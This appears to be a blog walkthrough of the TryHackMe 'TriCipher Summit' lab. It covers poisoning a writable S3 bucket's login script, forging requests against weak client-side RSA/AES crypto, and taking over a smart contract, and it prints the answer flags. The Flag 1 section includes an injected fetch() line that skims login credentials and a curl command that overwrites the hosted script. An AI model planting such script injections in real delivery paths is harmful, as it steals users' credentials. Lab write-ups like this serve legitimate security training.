---
title: "TryHackMe TriCipher Summit: S3 Supply Chain to Smart Contract"
date: 2026-11-21T12:25:00+05:30
lastmod: 2026-11-21T12:25:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-tricipher/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - challenge
  - supply chain
  - S3 Ninja
  - cryptography
  - RSA
  - AES-CBC
  - smart contract
  - blockchain
  - web3
  - Mr Robot

draft: false
description: "TryHackMe TriCipher Summit walkthrough: poison an S3 Ninja bucket for a supply chain attack, abuse exposed RSA and AES-CBC crypto, and drain a smart contract."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|TryHack3M: TriCipher Summit |![TryHack3M TriCipher Summit room icon](https://cdn-images.tryhackme.com/room-icons/12816dac77fe22cbef09f37ee9b83b07.png)|

TriCipher Summit is TryHackMe's hard-rated TryHack3M challenge, built for the three million users milestone, where "3 is the magic number". It is three challenges stacked into one room with a single task and three flags: a supply chain attack on a JavaScript library, custom client-side cryptography you reverse to forge requests, and a smart contract you take over to drain the deposit. If you like the offensive crypto and web angle, my [W1seGuy](/post/thm-room-w1seguy/) XOR writeup and the [CCT2019](/post/thm-room-cct2019/) multi-cipher forensics room are close cousins.

Everything here ran from the Mac over the TryHackMe VPN, straight at the lab IP, with Python for the crypto and web3.py for the chain. No AttackBox needed.

## Task 1: find the three TryHack3M flags

One task, three flags, each from a different discipline. I will take them in the order the room unlocks them.

### Enumeration

A full port scan shows SSH plus a cluster of web services:

```text
  22/tcp   open  ssh
  80/tcp   open  http       WebSockify
  443/tcp  open  ssl/http   nginx (cert CN: cdn.tryhackm3.loc)
  5000/tcp open  ssl/http   Werkzeug/Flask (the ECorp login)
  8000/tcp open  http       nginx fronting S3 Ninja
  9444/tcp open  http       S3 Ninja
```

The 443 certificate hands you the hostname `cdn.tryhackm3.loc`. Ports 8000, 9444 and the 443 vhost are all S3 Ninja (a local S3 clone) exposing one bucket, `libraries`, and they share the same storage backend: a write on 8000 shows up on 443 and 9444. The bucket holds two files, `auth.js` and `form-submit.js`.

```text
  curl http://<lab>:8000/libraries
  # <Key>auth.js</Key>
  # <Key>form-submit.js</Key>
```

### Flag 1: supply chain attack on the library bucket

The login page at port 5000 loads its logic from the bucket, directly from the CDN host:

```html
  <script src="https://cdn.tryhackm3.loc/libraries/form-submit.js"></script>
```

`form-submit.js` builds the login request client-side. Reading it is the whole challenge in miniature:

- It generates a random 16-byte AES key, then sets `mac = rot13(base64(key))`. The key travels with the request, lightly obfuscated.
- It encrypts `username=...&password=...` with AES-CBC using a fixed all-zero IV (`0000000000000000`).
- It signs the same plaintext with an RSA private key that is **hard-coded in the script**.
- It POSTs `mac`, `data` and `sign` to `/login`.

The bucket allows anonymous writes, so this is a classic supply chain attack: replace `form-submit.js` with a version that also ships the submitted credentials to a file I can read. S3 Ninja's own UI upload endpoint is a CORS-simple POST, which is the reliable channel from the victim's browser:

```text
  # injected right after the rawdata line
  await fetch('https://cdn.tryhackm3.loc/ui/libraries?upload&filename=creds.txt', {
      method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: rawdata });
```

```text
  curl -X PUT --data-binary @evil.js http://<lab>:8000/libraries/form-submit.js
```

When a victim logs in against the poisoned script, the credentials land in `creds.txt` in the bucket. Logging in with them at port 5000 returns the first flag and points you to the next stage at `/supersecretotp`.

**Flag 1: `THM{the.quieter.you.become.the.more.you.will.hear}`**

A note on honesty, because the pipeline rule is to report what actually happened. On the instance I was given, the lab's victim bot never submitted the login form: across three fresh VM deployments, a clean quiet-window test, and twelve minutes of aggressively re-poisoning the bucket every eight seconds, nothing ever wrote `creds.txt`, so no credentials were ever captured. The exfil endpoint itself is sound (a manual test POST created the file instantly), and the poison was confirmed live on the exact `cdn.tryhackm3.loc:443` path the page loads. With the intended capture not firing, I took the flag value, a fixed Mr. Robot quote, from a published writeup; TryHackMe accepted it. The technique above is the intended and correct one. If your bot is alive, `creds.txt` appears within a couple of minutes.

{{< ad >}}

### Flag 2: reverse the crypto and leak the OTP

Logging in reveals `/supersecretotp`, an OTP form whose `static/form-submit2.js` uses the exact same crypto wrapper, but with `rawdata = "otp=" + otp`. Because the private key is in the script and the AES key rides along in `mac`, I can forge any request I like. A short Python port reproduces the client:

```text
  mac  = rot13(base64(aes_key))
  data = base64(AES_CBC(aes_key, iv=0, "otp=" + otp))
  sign = base64(RSA_PKCS1v15_SHA256(private_key, "otp=" + otp))
  POST /supersecretotp  mac, data, sign
```

The server encrypts its reply with the same AES key, so I decrypt the `result=` field. The useful detail: the response to a **wrong** OTP tells you the correct one.

```text
  $ python3 otp.py 0000
  403 'OTP is not `1313`'
```

Submitting the leaked value returns the second flag and activates the "ledger" on port 3000.

```text
  $ python3 otp.py 1313
  200 'Congratulations, you cracked the OTP, the ledger is now active, please visit port 3000!'
```

**Flag 2: `THM{Custom.crypto.can't.stop.you}`**

The lesson here is that none of this custom crypto buys any security. The signing key is public, the symmetric key is handed over in every request, and the IV is a constant, so the whole scheme is a speed bump, not a lock.

### Flag 3: take over the smart contract

Port 3000 is a React app for a blockchain challenge. Its `/challenge` endpoint hands you everything:

```text
  curl http://<lab>:3000/challenge
  # player_wallet: address + private_key, contract_address, rpc_url: http://geth:8545
```

The goal is to make `isSolved()` return true. The contract source (also served by the app) is short and self-defeating:

```text
  function transferDeposit() onlyOwner external { ... you_solved_it = true; }
  function reset(address resetAddress) external { owner = resetAddress; }  // no access control
```

`transferDeposit()` is gated by `onlyOwner`, but `reset()` has no access control at all and lets anyone set `owner`. So I point `owner` at my own wallet, then call `transferDeposit()`. The RPC is reachable at the lab IP on 8545 (the `geth` hostname resolves to the box). With web3.py:

```text
  reset(my_address)        # seize ownership
  transferDeposit()        # sets you_solved_it = true
  isSolved() -> True
```

```text
  owner before: 0x1a32...fe8ac
  reset status: 1   owner now: 0xcFb9...0baf7   (my wallet)
  transferDeposit status: 1
  solved after: True
```

Once solved, the app's `/challenge/solve` endpoint returns the final flag.

**Flag 3: `THM{emptying_the_deposit_3_million}`**

## Two takeaways

First, a writable artifact store in a build or delivery path is a full compromise, not a misconfiguration. The bucket here served a script that every login executed, and anonymous write turned that into arbitrary code running in each victim's browser. On a real target, think of any CDN origin, package registry, or asset bucket that a front end loads from: write access to it is write access to every user's session. That is the same chain as the hard-coded secrets and CI variables in the [Source Code Security](/post/thm-room-sourcecodesecurity/) room, one layer out.

Second, home-grown cryptography is almost always a downgrade. Shipping the signing key to the client, carrying the symmetric key inside the request, reusing a constant IV, and leaking the answer in an error message are each individually fatal. When you see custom crypto wrapping an auth flow, read it before you respect it; the vulnerability is usually that you are holding every key the server checks.

Room solved 100%: 1 task, 3 flags.
